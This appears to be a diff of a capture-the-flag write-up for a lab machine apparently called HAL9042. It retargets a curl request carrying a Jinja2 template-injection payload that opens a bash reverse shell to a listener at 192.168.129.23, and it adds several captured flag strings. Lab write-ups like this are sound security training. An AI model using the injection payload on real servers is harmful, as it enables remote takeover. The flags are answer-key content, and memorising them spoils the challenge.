@@ -19,7 +19,7 @@ window.HAL_DEBUG = {
 we learned that the server is using jinja2 templates so we can try to inject python code using this evaluate endpoint with those headers
 ```
 nc -lvnp 4444
-curl -X POST http://localhost:5042/evaluate \
+curl -X POST http://192.168.56.102:5042/evaluate \
   -H "X-Debug-Render: true" \
   --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\"').read() }}"
 ```
@@ -181,10 +181,6 @@ we got root
 
 ## flag
 
-### 1
-we find the first flag by playing with the url.
-/flag gives us FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}
-
 ### escalation flags
 
 once we're root can find a flagd service with a find command
@@ -230,4 +226,14 @@ curl http://127.0.0.1:9000/internal/telemetry
 that gives us 
 ```
 FLAG{b4sh_h1st0ry_1s_4_d14ry}
+```
+
+
+for finish we find 3 file in the dos /etc/hal9042
+in this we find 4 file the name is daemon.env  reviewer.env  telemetry.env  whisper.env
+telemetry is the flag just up with sophie but we got ths 3 TODO
+```
+FLAG{pr0c_kn0ws_4ll_s3cr3ts}
+FLAG{h4l_r3v13ws_3v3ry_4pp34l}
+FLAG{udp_1s_4_wh1sp3r}
 ```
